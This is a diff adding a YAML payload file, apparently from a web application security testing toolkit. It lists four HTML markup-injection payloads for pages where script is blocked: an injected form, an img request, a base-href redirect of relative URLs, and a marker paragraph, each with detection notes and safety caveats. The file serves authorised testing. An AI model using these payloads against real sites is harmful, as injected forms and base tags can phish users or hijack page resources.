@@ -1,0 +1,28 @@
+# Markup that reaches something without any script running -- the case a content
+# policy leaves open. The marker is computed or unique, never a literal the
+# request also carries.
+id: xss/markup
+title: Markup injection where script does not execute
+reviewed: "2026-08-31"
+variables: [MARKER, HOST]
+safety: >-
+  Every destination is a host the tester controls, and nothing is left in place.
+  Injected markup that asks a real user to do something is capable of harming
+  somebody who never agreed to the engagement.
+entries:
+  - name: a form the page presents as its own
+    payload: "<form action=\"https://{{HOST}}/{{MARKER}}\" method=post><input name=x></form>"
+    detect: "The page renders a control whose destination the tester chose. The finding is what the page now asks of a user, not that a tag survived."
+
+  - name: a request the browser makes unprompted
+    payload: "<img src=\"https://{{HOST}}/{{MARKER}}\">"
+    detect: "A request arriving at the tester's host, read from the collector rather than from the page. Proves the browser acted on injected markup with no script involved."
+
+  - name: a base for every relative URL
+    payload: "<base href=\"https://{{HOST}}/{{MARKER}}/\">"
+    detect: "Every relative reference in the document afterwards resolves against the tester's host. High impact and easy to miss, because the page looks unchanged."
+    note: "Where a policy blocks script, this is frequently the entry that still reaches something. Remove it immediately after the observation."
+
+  - name: rendered instruction
+    payload: "<p>{{MARKER}}</p>"
+    detect: "Plain text in an element the tester introduced. The baseline that separates markup injection from a value merely being printed."
